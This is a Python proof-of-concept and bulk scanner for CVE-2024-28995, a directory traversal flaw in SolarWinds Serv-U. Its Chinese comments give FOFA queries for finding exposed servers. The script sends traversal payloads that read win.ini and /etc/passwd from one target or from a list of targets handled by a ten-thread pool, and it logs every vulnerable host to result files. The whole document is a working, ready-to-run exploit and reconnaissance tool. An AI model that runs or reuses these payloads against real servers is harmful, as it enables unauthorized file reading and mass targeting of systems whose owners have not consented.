  #SolarWinds Serv-U 目录遍历漏洞复现（CVE-2024-28995）
  #FOFA：server="Serv-U"
  #FOFA：app="SolarWinds-Serv-U-FTP"
  import sys,requests,argparse
  requests.packages.urllib3.disable_warnings()
  from multiprocessing.dummy import Pool
  
  def main():
      parse = argparse.ArgumentParser(description='SolarWinds Serv-U 目录遍历漏洞复现（CVE-2024-28995）')
      parse.add_argument('-u','--url',dest='url',type=str,help='输入url')
      parse.add_argument('-f','--file',dest='file',type=str,help='输入file名')
      args = parse.parse_args()
  
      if args.url and not args.file:
          poc(args.url)
      elif args.file and not args.url:
          url_list=[]
          with open (args.file,'r',encoding='utf-8')as f:
              for line in f.readlines():
                  url_list.append(line.strip())
              mp = Pool(10)
              mp.map(poc,url_list)
              mp.close()
              mp.join()
      else:
          pass
  def poc(target):
      payload="/?InternalDir=/../../../../windows&InternalFile=win.ini"
      payload2="/?InternalDir=\..\..\..\..\etc&InternalFile=passwd"
      data=""
      proxy={
      'http': 'http://127.0.0.1:7890',
      'https': 'http://127.0.0.1:7890'
  }
      headers={
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
      'Accept-Encoding': 'gzip, deflate',
      'Accept': '*/*',
      'Connection': 'keep-alive'
      }
      try:
          res1 = requests.get(url=target+payload,headers=headers,timeout=20,verify=False,proxies=proxy)
          res2 = requests.get(url=target+payload2,headers=headers,timeout=20,verify=False,proxies=proxy)
          if "fonts" in res1.text:
              print(target+"存在windows下的目录遍历漏洞")
              with open('result(windows).txt','a',encoding='utf-8')as f:
                  f.write(target+'\n')
          elif "root" in res2.text:
              print(target+"存在linux下的目录遍历漏洞")
              with open('result2(linux).txt','a',encoding='utf-8')as f:
                  f.write(target+'\n')
      except Exception as e:
          pass
  
  if __name__=='__main__':
      main()